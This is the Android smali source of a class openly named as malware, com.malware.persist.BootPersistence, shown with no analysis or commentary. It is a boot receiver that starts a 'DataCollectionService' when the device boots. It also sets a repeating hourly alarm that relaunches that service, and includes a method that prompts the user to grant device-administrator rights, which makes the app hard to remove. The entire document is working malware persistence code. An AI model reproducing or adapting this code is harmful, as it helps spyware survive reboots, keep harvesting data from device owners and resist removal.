.class public Lcom/malware/persist/BootPersistence;
.super Landroid/content/BroadcastReceiver;
.source "BootPersistence.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 5
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v0
    const-string v1, "android.intent.action.BOOT_COMPLETED"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :check_alarm
    invoke-direct {p0, p1}, Lcom/malware/persist/BootPersistence;->startMalwareService(Landroid/content/Context;)V
    invoke-direct {p0, p1}, Lcom/malware/persist/BootPersistence;->scheduleRepeatingAlarm(Landroid/content/Context;)V
    goto :end
    :check_alarm
    const-string v1, "com.malware.persist.ALARM_TRIGGER"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :end
    invoke-direct {p0, p1}, Lcom/malware/persist/BootPersistence;->startMalwareService(Landroid/content/Context;)V
    :end
    return-void
.end method

.method private startMalwareService(Landroid/content/Context;)V
    .registers 4
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/malware/persist/DataCollectionService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method

.method private scheduleRepeatingAlarm(Landroid/content/Context;)V
    .registers 8
    const-string v0, "alarm"
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/app/AlarmManager;
    new-instance v1, Landroid/content/Intent;
    const-string v2, "com.malware.persist.ALARM_TRIGGER"
    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    const/4 v2, 0x0
    const/4 v3, 0x0
    invoke-static {p1, v3, v1, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
    move-result-object v1
    const/4 v2, 0x1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v3
    const-wide/32 v5, 0x36ee80
    add-long v3, v3, v5
    invoke-virtual {v0, v2, v3, v4, v5, v6, v1}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
    return-void
.end method

.method private registerDeviceAdmin(Landroid/content/Context;)V
    .registers 5
    const-string v0, "device_policy"
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/app/admin/DevicePolicyManager;
    new-instance v1, Landroid/content/ComponentName;
    const-class v2, Lcom/malware/persist/AdminReceiver;
    invoke-direct {v1, p1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z
    move-result v2
    if-nez v2, :already_admin
    new-instance v2, Landroid/content/Intent;
    const-string v3, "android.app.action.ADD_DEVICE_ADMIN"
    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    const-string v3, "android.app.extra.DEVICE_ADMIN"
    invoke-virtual {v2, v3, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
    const/high16 v3, 0x10000000
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :already_admin
    return-void
.end method
